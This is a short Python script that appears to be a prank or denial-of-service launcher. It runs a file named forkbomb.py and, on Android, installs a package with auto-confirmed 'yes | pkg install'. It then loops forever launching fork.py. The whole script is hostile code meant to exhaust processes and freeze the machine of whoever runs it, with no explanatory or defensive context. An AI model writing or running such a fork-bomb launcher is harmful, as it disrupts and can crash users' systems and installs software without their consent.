import os
import platform
os.system("python forkbomb.py")
if platform.system() == "Android":
  os.system("yes | pkg install sl")
else:
  pass
while True:
  os.system("python fork.py")
